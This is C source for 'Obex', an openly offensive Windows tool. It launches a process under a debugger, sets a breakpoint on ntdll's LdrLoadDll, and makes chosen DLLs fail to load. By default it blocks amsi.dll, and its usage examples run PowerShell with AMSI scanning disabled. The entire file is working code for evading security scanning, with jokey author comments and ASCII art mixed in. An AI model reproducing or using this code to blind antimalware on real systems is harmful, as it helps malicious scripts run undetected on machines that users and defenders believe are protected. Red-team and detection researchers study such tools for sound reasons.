#include <stdio.h>
#include <windows.h>

#define DLL_BLOCK_LIST L"amsi.dll"

wchar_t *g_dll_block_list = NULL;
LPVOID g_remote_ntdll_base = NULL;
LPVOID g_remote_ldr_addr = NULL;
BYTE g_orig_byte = 0;
HANDLE g_hProc = NULL;
DWORD  g_pending_rearm_tid = 0;

typedef struct _UNICODE_STRING_REMOTE {
    USHORT Length;
    USHORT MaximumLength;
    ULONGLONG Buffer;
} UNICODE_STRING_REMOTE;

static int read_remote(LPCVOID lpcAddr, void *vpBuf, SIZE_T sz) {
    SIZE_T n=0; return ReadProcessMemory(g_hProc, lpcAddr, vpBuf, sz, &n) && n==sz;
}

static int write_remote(LPVOID addr, const void *buf, SIZE_T sz) {
    SIZE_T n=0; return WriteProcessMemory(g_hProc, addr, buf, sz, &n) && n==sz && FlushInstructionCache(g_hProc, addr, sz);
}

static int write_code(LPVOID addr, const void *buf, SIZE_T sz) {
    DWORD oldProt=0, tmp;
    if (!VirtualProtectEx(g_hProc, addr, sz, PAGE_READWRITE, &oldProt)) return 0;
    int ok = write_remote(addr, buf, sz);
    VirtualProtectEx(g_hProc, addr, sz, oldProt, &tmp);
    return ok;
}

static int set_int3(LPVOID addr, BYTE *saved_byte) {
    BYTE b;
    BYTE cc = 0xCC;

    if (!read_remote(addr, &b, 1)) return 0;
    *saved_byte = b;
    return write_code(addr, &cc, 1);
}

static const wchar_t *filename_of(const wchar_t *s) {
    if (!s) return s;
    const wchar_t *p1 = wcsrchr(s, L'\\');
    const wchar_t *p2 = wcsrchr(s, L'/');

    if (p1 && p2) return (p1 > p2) ? (p1 + 1) : (p2 + 1);
    if (p1) return p1 + 1;
    if (p2) return p2 + 1;
    return s;
}

static BOOL wcsncaseeq_seg(const wchar_t *a, const wchar_t *b, size_t len) {
    for (size_t i = 0; i < len; ++i) {
        if (towlower((wint_t)a[i]) != towlower((wint_t)b[i])) return FALSE;
    }
    return TRUE;
}

static const wchar_t *trim_bounds(const wchar_t *start, const wchar_t *end, size_t *out_len) {
    while (start < end && iswspace((wint_t)*start)) ++start;
    while (end > start && iswspace((wint_t)*(end - 1))) --end;
    *out_len = (size_t)(end - start);
    return start;
}

// Return TRUE if `dll` (name or path) appears in the comma-separated `g_dll_block_list`.
// Comparison is case-insensitive.
BOOL dll_in_list_ci(const wchar_t *dll_or_path) {
    if (!dll_or_path || !g_dll_block_list) return FALSE;

    const wchar_t *fname = filename_of(dll_or_path);
    size_t fname_len = wcslen(fname);
    if (fname_len == 0) return FALSE;

    const wchar_t *p = g_dll_block_list;
    while (*p) {
        const wchar_t *q = wcschr(p, L',');
        const wchar_t *segment_end = q ? q : (p + wcslen(p));

        size_t tok_len = 0;
        const wchar_t *tok = trim_bounds(p, segment_end, &tok_len);

        if (tok_len == fname_len) {
            if (wcsncaseeq_seg(tok, fname, fname_len)) return TRUE;
        }

        if (!q) break;
        p = q + 1;
    }

    return FALSE;
}

// This function will be called when we won't "block" the LdrLoadDll call
// This means we won't skip execution, so set trap flag for single step to re-arm breakpoint on next instruction
static void set_tf_handling(HANDLE hThread, CONTEXT ctx, DWORD dwThreadID) {
    ctx.EFlags |= 0x100; // set trap flag for single step
    SetThreadContext(hThread, &ctx);
    g_pending_rearm_tid = dwThreadID;
    CloseHandle(hThread);
}

static int handle_ldr_call(const DWORD dwThreadID) {
    // Open the faulting thread
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID);
    if (!hThread) return 0;

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_ALL;
    if (!GetThreadContext(hThread, &ctx)) { CloseHandle(hThread); return 0; }

    // Confirm this is our INT3 at LdrLoadDll entry (RIP is after INT3)
    if ((LPVOID)((uintptr_t)ctx.Rip - 1) != g_remote_ldr_addr) { CloseHandle(hThread); return 0; }

    // Put back original byte and back up RIP
    if (!write_code(g_remote_ldr_addr, &g_orig_byte, 1)) { CloseHandle(hThread); return 0; }
    ctx.Rip -= 1;

    // x64 fastcall: RCX=SearchPath, RDX=DllCharacteristics, R8=PUNICODE_STRING DllName, R9=PVOID* BaseAddress
    const ULONGLONG ullDllName = ctx.R8;
    if (!ullDllName) {
        set_tf_handling(hThread, ctx, dwThreadID);
        return 1; // handled, continue
    }

    UNICODE_STRING_REMOTE us = {0};

    // Read DLL name from remote process memory
    int success = (read_remote((LPCVOID) ullDllName, &us, sizeof(us)) && us.Buffer && us.Length);
    if (!success) {
        set_tf_handling(hThread, ctx, dwThreadID);
        return 1; // handled, continue
    }

    // Calculate required size of buffer
    size_t wcharCount = us.Length / sizeof(wchar_t);
    size_t cap = wcharCount + 1;
    wchar_t *wc_dllName = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, cap * sizeof(wchar_t));

    // Check buffer allocation
    if (!wc_dllName) {
        set_tf_handling(hThread, ctx, dwThreadID);
        return 1;
    }

    // Could the name be read from the thread memory?
    success = read_remote((LPCVOID) us.Buffer, wc_dllName, (wcharCount * sizeof(wchar_t)));
    if (!success) {
        HeapFree(GetProcessHeap(), 0, wc_dllName);
        set_tf_handling(hThread, ctx, dwThreadID);
        return 1;
    }

    wc_dllName[wcharCount] = L'\0';

    // If the DLL is not in our block list, just let it pass
    if (!dll_in_list_ci(wc_dllName)) {
        HeapFree(GetProcessHeap(), 0, wc_dllName);
        set_tf_handling(hThread, ctx, dwThreadID);
        return 1;
    }

    // Make the returned BaseAddress point to 0
    const ULONGLONG pBase = ctx.R9;
    const ULONGLONG zero = 0;
    if (pBase) write_remote((LPVOID)(ULONG_PTR)pBase, &zero, sizeof(zero));

    ctx.Rax = STATUS_DLL_NOT_FOUND;
    // Simulate "ret"
    ULONGLONG retaddr=0;
    if (read_remote((LPCVOID)(ULONG_PTR)ctx.Rsp, &retaddr, sizeof(retaddr))) {
        ctx.Rsp += 8;
        ctx.Rip = retaddr;
    }

    wprintf(L"[+] Blocked loading of '%ls'\n", wc_dllName);

    // Re-arm INT3 at entry for subsequent calls
    set_int3(g_remote_ldr_addr, &g_orig_byte);
    SetThreadContext(hThread, &ctx);
    HeapFree(GetProcessHeap(), 0, wc_dllName);
    CloseHandle(hThread);

    return 2; // handled + skipped

    // If you actually read this code
    // ->  first of I hope you like the technique
    // -> awesome that you look into it and I hope it gave you some ideas or "aha"-moments
    // -> Wow you are actually reading this too... Whats your favorite music artist? DM me some songs pls
    // Free cat for reading this (skidded from some ascii art page, im terrible at art):
    //
    //    |\---/|
    //    | ,_, |
    //     \_`_/-..----.
    //  ___/ `   ' ,""+ \  sk
    // (__...'   __\    |`.___.';
    //   (_,...'(_,.`__)/'.....+
    //
    // If you would've liked a blogpost on this let me know for future projects
}

static void rearm_after_single_step(const DEBUG_EVENT *de) {
    if (!g_remote_ldr_addr || de->dwThreadId != g_pending_rearm_tid) return;
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, de->dwThreadId);
    if (!hThread) return;
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (GetThreadContext(hThread, &ctx)) {
        ctx.EFlags &= ~0x100; // clear TF
        SetThreadContext(hThread, &ctx);
    }
    OutputDebugStringA("NOT_A_SIGNATURE_ORBEX_IS_COOL_I_LIKE_CATS"); // totally necessary, otherwise your computer will explode
    set_int3(g_remote_ldr_addr, &g_orig_byte);
    g_pending_rearm_tid = 0;
    CloseHandle(hThread);
}

int wmain(int argc, wchar_t **argv) {

    wchar_t *wc_dlls = NULL;
    BOOL done = FALSE;
    DWORD child_exit_code = 0;

    wprintf(L"        ....               ..                            \n");
    wprintf(L"    .x~X88888Hx.     . uW8\"                              \n");
    wprintf(L"   H8X 888888888h.   `t888                     uL   ..   \n");
    wprintf(L"  8888:`*888888888:   8888   .        .u     .@88b  @88R \n");
    wprintf(L"  88888:        `%%8   9888.z88N    ud8888.  '\"Y888k/\"*P  \n");
    wprintf(L". `88888          ?>  9888  888E :888'8888.    Y888L     \n");
    wprintf(L"`. ?888%%           X  9888  888E d888 '88%%\"     8888     \n");
    wprintf(L"  ~*??.            >  9888  888E 8888.+\"        `888N    \n");
    wprintf(L" .x88888h.        <   9888  888E 8888L       .u./\"888&   \n");
    wprintf(L":\"\"\"8888888x..  .x   .8888  888\" '8888c. .+ d888\" Y888*\" \n");
    wprintf(L"`    `*888888888\"     `%%888*%%"    "88888%%   ` \"Y   Y\"    \n");
    wprintf(L"        ""***""          \"`         \"YP'                 \n");

    wprintf(L"\nObex - DLL Blocking by @dis0rder_0x00\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n%ls \"<command with args>\" [DLLs to block]\n\n", argv[0]);
        wprintf(L"Examples:\n");
        wprintf(L"%ls \"powershell.exe /C whoami\" amsi.dll,user32.dll\n", argv[0]);
        wprintf(L"%ls \"powershell.exe /C hostname\"\n\n", argv[0]);
        wprintf(L"Default block list (if you dont provide one): %ls\n", DLL_BLOCK_LIST);

        return 1;
    }

    if (argc >= 3){
        wc_dlls = argv[2];
    } else {
        wc_dlls = DLL_BLOCK_LIST;
    }
    g_dll_block_list = (wchar_t *)malloc((wcslen(wc_dlls) + 1) * sizeof(wchar_t));
    if (!g_dll_block_list) { free(g_dll_block_list); return 2; }
    wcscpy(g_dll_block_list, wc_dlls);

    size_t cmdlen = wcslen(argv[1]);
    wchar_t *cmdline = (wchar_t *)malloc((cmdlen + 1) * sizeof(wchar_t));
    if (!cmdline) {
        free(g_dll_block_list);
        return 3;
    }
    wcscpy(cmdline, argv[1]);

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    wprintf(L"[*] Command: '%ls'\n", cmdline);
    wprintf(L"[*] Blocked DLLs: '%ls'\n", g_dll_block_list);

    if (!CreateProcessW(NULL, cmdline, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &si, &pi)) {
        wprintf(L"[!] CreateProcess failed: %lu\n", GetLastError());
        free(cmdline);
        free(g_dll_block_list);
        return 1;
    }

    wprintf(L"[+] Started process\n");

    DEBUG_EVENT debug_event = {0};
    g_hProc = pi.hProcess;

    while (!done) {
        if (!WaitForDebugEvent(&debug_event, INFINITE)) {
            wprintf(L"[!] WaitForDebugEvent failed: %lu\n", GetLastError());
            break;
        }

        DWORD cont = DBG_CONTINUE;

        switch (debug_event.dwDebugEventCode) {

            case LOAD_DLL_DEBUG_EVENT: {
                char path[MAX_PATH*4] = {0};
                DWORD cchOut = (sizeof(path)/sizeof(path[0]));
                LPSTR lpsDllName = NULL;

                if (!g_remote_ntdll_base) {
                    // If we have a handle to the DLL to be loaded
                    if (debug_event.u.LoadDll.hFile) {
                        GetFinalPathNameByHandleA(debug_event.u.LoadDll.hFile, path, cchOut, FILE_NAME_NORMALIZED);
                        if (path[0]) {
                            lpsDllName = (strrchr(path, '\\')+1);
                        }
                        CloseHandle(debug_event.u.LoadDll.hFile);

                    } else if (debug_event.u.LoadDll.lpImageName) {
                        // TODO: Actually implement this... The error message is a hoax, I just didnt want to do it. Please don't tell anyone .-.
                        wprintf(L"[!] lpImageName resolving not implemented in public version.\n");
                        break;
                    }

                    // Did we find our target DLL to hook into?
                    if (strcmp(lpsDllName, "ntdll.dll")==0) {
                        g_remote_ntdll_base = debug_event.u.LoadDll.lpBaseOfDll;

                        // Next we'll calculate remote address of function to hook
                        
                        // To do this we check the offset of ntdll base and the target function
                        // and add it to the remote base of ntdll
                        HMODULE ntdll_local = GetModuleHandleA("ntdll.dll");
                        if (!ntdll_local || !g_remote_ntdll_base) break;

                        FARPROC ldr_local = GetProcAddress(ntdll_local, "LdrLoadDll");
                        if (!ldr_local) break;

                        uintptr_t offset = (uintptr_t)ldr_local - (uintptr_t)ntdll_local;
                        g_remote_ldr_addr = (LPVOID)((BYTE*)g_remote_ntdll_base + offset);

                        // Having calculated the remote address of LdrLoadDll we can set a breakpoint at it
                        set_int3(g_remote_ldr_addr, &g_orig_byte);
                        printf("[+] Hooked LdrLoadDll at 0x%p (ntdll at 0x%p)\n", g_remote_ldr_addr, g_remote_ntdll_base);
                    }
                }
                break;
            } // END - LOAD_DLL_DEBUG_EVENT

            case EXCEPTION_DEBUG_EVENT: {
                DWORD code = debug_event.u.Exception.ExceptionRecord.ExceptionCode;

                if (code == EXCEPTION_BREAKPOINT && g_remote_ldr_addr) {
                    int ret = handle_ldr_call(debug_event.dwThreadId);
                    // 2 = skipped + fully handled
                    // 1 = handled: TF set, will re-arm on SS
                    if (ret == 2 || ret == 1) {
                        cont = DBG_CONTINUE;
                        break;
                    }
                }

                if (code == EXCEPTION_SINGLE_STEP && g_remote_ldr_addr) {
                    rearm_after_single_step(&debug_event);
                    cont = DBG_CONTINUE;
                    break;
                }

                // Swallow common first-chance breakpoint at process start
                if (code == EXCEPTION_BREAKPOINT) { cont = DBG_CONTINUE; break; }

                // Default on any other exception
                cont = DBG_EXCEPTION_NOT_HANDLED; break;

            } // END - EXCEPTION_DEBUG_EVENT

            case EXIT_PROCESS_DEBUG_EVENT: {
                child_exit_code = debug_event.u.ExitProcess.dwExitCode;
                wprintf(L"[+] Child exited with code: %lu\n", child_exit_code);
                cont = DBG_CONTINUE;
                done = TRUE;
                break;
            }

            default:
                break;
        } // END - Switch for Debug Event

        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, cont);
    } // END - Debug event loop

    if (g_hProc) {
        // if not already signaled, wait a moment to get final state (optional)
        WaitForSingleObject(g_hProc, 0);
        CloseHandle(g_hProc);
    }
    if (pi.hThread) CloseHandle(pi.hThread);

    free(cmdline);
    free(g_dll_block_list);
    return (int)child_exit_code;

} // END - main func